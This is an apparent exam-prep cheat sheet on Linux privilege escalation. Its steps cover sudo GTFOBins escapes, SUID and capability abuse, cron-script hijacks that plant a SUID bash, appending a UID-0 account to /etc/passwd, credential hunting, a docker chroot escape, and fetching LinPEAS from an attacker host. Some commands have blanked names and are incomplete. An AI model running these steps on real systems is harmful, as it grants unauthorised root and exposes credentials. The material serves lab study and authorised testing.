> Purpose: go from a low-privilege shell to root by checking the five things that actually pay — sudo rights, SUID/SGID, capabilities, cron, and writable system files — before running any automated scanner. ## Why manual first Automated tools (LinPEAS, pspy) are excellent at coverage and terrible at judgement. They print 400 lines; the exam gives you 24 points for acting on the right one. Manual checks cost 15-20 minutes and usually find the intended path; the scanner is for when they don't. Order: manual (Section A-F) → decision point (Section J) → automated (Section H-I) → kernel exploits last. ## A. Triage in 60 seconds ### Step 01 — Who am I and what can I run? Priority: Core · Run on: target · Status: Syntax Checked ```bash id; whoami; sudo -l; sudo -V ``` Look for: group membership (sudo, adm, docker, lxd), NOPASSWD entries, (ALL : ALL) ALL, and the sudo version.
Decision: any NOPASSWD binary → Step 02. (ALL : ALL) ALL with a known password → sudo su -. Nothing → Step 03.
Next: Step 02.
Common mistake: running sudo -l and stopping at the password prompt. If sudo wants a password, you do not have passwordless rights — read the rest of the output anyway.
Evidence: the exact sudo -l output. ### Step 02 — Turn a sudo right into a shell Priority: Core · Run on: target · Status: Syntax Checked ```bash sudo -l # then match the binary against GTFOBins, e.g. sudo vim -c ':!/bin/sh' sudo find . -exec /bin/sh \; -quit sudo awk 'BEGIN {system("/bin/sh")}' sudo env /bin/sh sudo python3 -c 'import os; os.system("/bin/sh")' sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ``` Look for: a # prompt.
Decision: the listed binary is not in GTFOBins → Step 03 (version bugs) or Step 12 (PATH hijack, if the sudo command calls another binary).
Next: capture proof.
Common mistake: assuming a sudo rule ending in a specific argument can't be escaped. Payloads usually go after the binary, and ;/-c often allow a command.
Evidence: id as root in the same session where sudo -l was shown. ### Step 03 — Is sudo itself vulnerable? Priority: Conditional · Run on: target · Status: Documented ```bash sudo --version ``` Look for: versions affected by known sudo bugs (e.g. CVE-2021-3156 "Baron Samedit", CVE-2019-14287 -u#-1).
Decision: version matches a public advisory → read the exploit's requirements before running it. Many need specific sudoers entries.
Next: exploit, or move to Section B.
Common mistake: firing a sudo CVE because the version "looks old" without checking the distribution's backported patches.
Evidence: the version string plus the advisory. ## B. SUID and SGID ### Step 04 — Find SUID binaries Priority: Core · Run on: target · Status: Syntax Checked ```bash find / -perm -4000 -type f 2>/dev/null find / -perm -2000 -type f 2>/dev/null ``` Look for: anything outside the standard set (su, passwd, mount, ping, sudo). Unusual names are the lead.
Decision: a non-standard binary → Step 05. Only standard binaries → check versions and move to Section C.
Next: Step 05.
Common mistake: ignoring the owner. A SUID binary owned by root is interesting; one owned by a normal user is usually a leftover.
Evidence: the file list with ls -l for the interesting entries. ### Step 05 — Exploit a SUID binary Priority: Core · Run on: target · Status: Syntax Checked ```bash ls -l /usr/local/bin/ /usr/local/bin/ --help # GTFOBins SUID patterns find . -exec /bin/sh -p \; -quit ./ ``` Look for: a # prompt, or a file-read primitive.
Decision: not in GTFOBins → strings it for embedded paths, check its version, or look for a shared-library hijack.
Next: proof, then stop.
Common mistake: running a SUID binary in a directory you control and losing the privilege because the binary drops it. Check ls -l for the s bit before and after.
Evidence: id showing euid=0. ### Step 06 — SGID and writable binaries Priority: Conditional · Run on: target · Status: Documented ```bash find / -perm -2000 -type f 2>/dev/null find / -type f -writable -not -path '/proc/*' 2>/dev/null | head -50 ``` Look for: SGID binaries in unusual groups (adm, disk), and root-owned scripts you can edit.
Decision: a root-owned script or binary you can write → replace its contents with a shell (keep a backup first).
Next: run it and check id.
Common mistake: overwriting a file you need later. Copy it to /tmp first.
Evidence: the writable file and its new behaviour. ## C. Capabilities ### Step 07 — Find file capabilities Priority: Core · Run on: target · Status: Syntax Checked ```bash getcap -r / 2>/dev/null ``` Look for: cap_setuid+ep, cap_setgid+ep, cap_dac_read_search+ep, cap_sys_admin+ep.
Decision: cap_setuid on an interpreter → Step 08. cap_dac_read_search → read /etc/shadow directly.
Next: Step 08.
Common mistake: looking only for SUID and forgetting capabilities, which are the modern equivalent and far less noisy.
Evidence: the getcap line. ### Step 08 — Abuse the capability Priority: Core · Run on: target · Status: Documented ```bash # cap_setuid on python python3 -c 'import os; os.setuid(0); os.system("/bin/sh")' # cap_dac_read_search -c 'print(open("/etc/shadow").read())' ``` Look for: a root shell or the shadow file.
Decision: root shell → proof. Shadow readable → crack hashes, then su.
Next: proof or cracking.
Common mistake: using the wrong interpreter path — getcap names the exact binary; use that one.
Evidence: id after the escape. ## D. Cron and timers ### Step 09 — Enumerate scheduled work Priority: Core · Run on: target · Status: Syntax Checked ```bash cat /etc/crontab ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null crontab -l 2>/dev/null systemctl list-timers --all 2>/dev/null ``` Look for: a job running as root that executes a script in a writable location, or a wildcard (*) in a directory you control.
Decision: writable script → Step 10. Wildcard in a writable dir → tar/rsync wildcard injection.
Next: Step 10.
Common mistake: only running crontab -l — that shows your jobs, not root's. /etc/crontab and /etc/cron.d matter more.
Evidence: the crontab line with its user field. ### Step 10 — Hijack the job Priority: Conditional · Run on: target · Status: Documented ```bash ls -la /path/to/script.sh cp /path/to/script.sh /tmp/script.sh.bak printf '#!/bin/sh cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash ' > /path/to/script.sh # wait for the next run /tmp/rootbash -p ``` Look for: /tmp/rootbash appearing with the SUID bit.
Decision: the job is not writable → check whether its directory is (you can replace the script), or whether it calls a binary via a relative path.
Next: proof.
Common mistake: making the payload noisy or deleting the original script. Back it up; the box must stay usable.
Evidence: the modified script, the resulting SUID binary, id as root. ## E. Writable system files ### Step 11 — Check the files that define identity Priority: Core · Run on: target · Status: Syntax Checked ```bash ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ 2>/dev/null ``` Look for: -rw-rw-rw- on /etc/passwd, or any write bit for your user on shadow/sudoers.
Decision: passwd writable → Step 12. shadow readable → Step 13.
Next: Step 12.
Common mistake: assuming /etc/passwd is never writable. Misconfigured containers and lab builds do it often.
Evidence: the ls -l line. ### Step 12 — Add a root account (passwd writable) Priority: Conditional · Run on: target · Status: Documented ```bash openssl passwd -1 -salt x pwned # append: pwned::0:0:root:/root:/bin/bash echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd su pwned ``` Look for: a root shell from su pwned.
Decision: su asks for a password → the hash format is wrong; regenerate it.
Next: proof.
Common mistake: using a modern $6$ hash in the passwd field — su expects the format the system's PAM is configured for; MD5 ($1$) is the safe default in labs.
Evidence: the new line and id after su. ### Step 13 — Read or write shadow Priority: Conditional · Run on: target · Status: Syntax Checked ```bash cat /etc/shadow 2>/dev/null | head # if writable, replace root's hash with a known one openssl passwd -1 -salt x pwned ``` Look for: readable hashes → crack offline; writable → replace root's hash.
Decision: crack succeeds → su root.
Next: proof.
Common mistake: cracking with the wrong mode. Confirm the hash prefix ($1$ MD5, $6$ SHA-512) before choosing a hashcat mode.
Evidence: the hash line and the recovered password. ### Step 14 — PATH hijacking Priority: Conditional · Run on: target · Status: Documented ```bash echo $PATH # if a root cron/SUID program calls a binary without a full path: mkdir -p /tmp/evil && printf '#!/bin/sh /bin/sh ' > /tmp/evil/ chmod +x /tmp/evil/ export PATH=/tmp/evil:$PATH ``` Look for: a root-run program that calls service, ps, ifconfig etc. without /usr/bin/.
Decision: the program runs with a clean PATH → this fails; check for relative-path execution instead.
Next: trigger the program.
Common mistake: assuming every cron job inherits your PATH. Most define their own; verify before spending time.
Evidence: the hijacked binary and the root shell it produced. ## F. NFS, credentials, and services ### Step 15 — NFS with no_root_squash Priority: Conditional · Run on: Kali + target · Status: Syntax Checked ```bash showmount -e mkdir -p /tmp/nfs && sudo mount -t nfs :/ /tmp/nfs -o nolock sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod +s /tmp/nfs/rootbash # on the target: /tmp/nfs/rootbash -p ``` Look for: no_root_squash in /etc/exports, and a SUID bash you created from Kali.
Decision: the mount is read-only or squashes root → dead end; try writing a cron entry instead.
Next: run the binary on the target.
Common mistake: creating the SUID file as your normal user — it must be created by root (hence sudo on Kali) for the bit to survive.
Evidence: the showmount output and id on the target. ### Step 16 — Hunt for credentials on disk Priority: Core · Run on: target · Status: Syntax Checked ```bash cat ~/.bash_history 2>/dev/null find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null grep -RIn -E 'password|passwd|pwd=' /var/www /opt /home 2>/dev/null | head -30 ls -la /var/backups /tmp 2>/dev/null ``` Look for: database passwords in web configs, SSH keys, backup archives, a .bash_history containing mysql -u root -p....
Decision: a password works for su/sudo → done. A key is found → try it against local users.
Next: use the credential.
Common mistake: only grepping for the word "password". Also search pass, pwd, secret, token, and connection strings.
Evidence: the file path and the exact line. ### Step 17 — Processes, ports and groups Priority: Core · Run on: target · Status: Syntax Checked ```bash ps aux --sort=-%cpu | head -20 ss -tlnp id docker ps 2>/dev/null ``` Look for: a root process running from a writable directory, an internal service bound to [localhost](http://localhost), and membership of docker or lxd.
Decision: docker group → Step 18. Root process in a writable path → Step 10 logic.
Next: Step 18, or pivot to the internal service.
Common mistake: ignoring [localhost](http://localhost)-only ports — they are usually the unreachable-from-outside admin service that grants root.
Evidence: the process/port list. ### Step 18 — Docker group to root Priority: Conditional · Run on: target · Status: Syntax Checked ```bash docker run -v /:/mnt --rm -it alpine chroot /mnt sh ``` Look for: a shell with the host filesystem mounted at /mnt.
Decision: image not present and no internet → use an existing image (docker images).
Next: read /mnt/root/proof.txt.
Common mistake: treating docker group membership as a minor finding. It is root, every time.
Evidence: id inside the chroot. ## G. Kernel exploits ### Step 19 — Version and matching exploits Priority: Conditional · Run on: target · Status: Syntax Checked ```bash uname -a; cat /etc/os-release searchsploit linux kernel $(uname -r | cut -d- -f1) ``` Look for: a kernel version matching a local privilege-escalation CVE (DirtyPipe, PwnKit via pkexec, OverlayFS).
Decision: a match → read the exploit fully; confirm the distro's patch level before running. Prefer a configuration flaw over a kernel exploit on the exam — a kernel panic costs the machine.
Next: run only after a snapshot/revert is acceptable.
Common mistake: running DirtyPipe/PwnKit blind because the kernel "looks old". Check pkexec --version and the patch date.
Evidence: the version, the exploit name, and why you believed it applied. ## H. Automated enumeration (after manual) ### Step 20 — LinPEAS Priority: Conditional · Run on: target · Status: Syntax Checked ```bash # serve from Kali python3 -m http.server 8000 # on target wget http://:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh -a 2>&1 | tee ``` Look for: the red/yellow 99% findings — SUID, capabilities, cron, .ssh, credentials, kernel.
Decision: every red finding still needs manual confirmation. LinPEAS reports possibilities, not vulnerabilities.
Next: verify the top finding by hand, then exploit it.
Common mistake: pasting LinPEAS output into a report as if it were a finding. The report needs the command you ran after it.
Evidence: the scan output (as an appendix) plus your manual confirmation. ### Step 21 — pspy (watch what root runs) Priority: Conditional · Run on: target · Status: Syntax Checked ```bash ./pspy64 -pf -i 1000 ``` Look for: recurring root commands with relative paths, writable scripts, or credentials in arguments.
Decision: a repeating job appears → Step 10.
Next: modify the target of the job.
Common mistake: running pspy for 30 seconds. Cron fires on the minute — watch for at least 2-3 minutes.
Evidence: the command line of the job you hijacked. ## I. Decision tree: manual to automated | What you found | Do this | Do not | | --- | --- | --- | | NOPASSWD sudo binary | GTFOBins (Step 02) | Assume you need a password | | Unusual SUID binary | GTFOBins / version check (Step 05) | Run kernel exploits first | | cap_setuid | Interpreter escape (Step 08) | Ignore capabilities | | Writable root cron script | Replace payload (Step 10) | Delete the original | | Writable /etc/passwd | Add root user (Step 12) | Edit root's existing line and lock yourself out | | no_root_squash NFS | SUID bash from Kali (Step 15) | Create it as a normal user | | Credentials in a config | Reuse locally (Step 16) | Crack what you already have | | Docker group | chroot escape (Step 18) | Treat it as low severity | | Nothing after 20-30 min of manual | Run LinPEAS (Step 20) | Keep repeating the same checks | | LinPEAS noisy, nothing conclusive | pspy for 3-5 min (Step 21) | Run kernel exploits blindly | | Kernel CVE matches | Read it, then decide (Step 19) | Panic the box on a hunch | Hard rule: after 45 minutes without a vector, revert and re-read the enumeration. A fresh look beats a fourth scanner. ## J. Troubleshooting | Symptom | Cause | Fix | | --- | --- | --- | | sudo -l asks for a password | No passwordless rule | Look for credentials; check sudo -V | | SUID binary drops privileges | It calls setuid(getuid()) | Look for a different binary | | Cron edit has no effect | Wrong user field, or cron not running | Check systemctl status cron; use /etc/cron.d | | su rejects the new account | Hash format | Regenerate with openssl passwd -1 | | Reverse shell never connects | Target cannot reach Kali (pivot) | See the pivoting note below | | getcap prints nothing | No capabilities set | Normal — move on | | Exploit compiles but fails | Missing headers/arch mismatch | Compile statically on Kali with the same arch | Pivoting variant. If the target can only reach an internal pivot, a reverse shell to Kali will never connect. Either catch it on the pivot host (ssh -R / chisel) or use a bind shell and reach it with proxychains4. Confirm the direction of reachability before you spend time on an exploit that needs a callback. ## K. Quick workflow 1. id; sudo -l; sudo -V 2. Match sudo rights to GTFOBins. 3. find / -perm -4000 -type f 2>/dev/null → GTFOBins. 4. getcap -r / → interpreter escape. 5. /etc/crontab + /etc/cron.d + timers → writable script. 6. ls -la /etc/passwd /etc/shadow → add user / crack. 7. Credentials on disk → reuse. 8. ps aux, ss -tlnp, id → services, docker, lxd. 9. NFS no_root_squash if exported. 10. Still nothing → LinPEAS → pspy → kernel. ## L. Evidence to preserve - The sudo -l output that justified the path. - The exact binary/permission that was wrong (ls -l). - The command that produced the root shell, and id as root. - cat /root/proof.txt and ip addr in the same screenshot. - A revert if your changes made the box unstable. ## M.
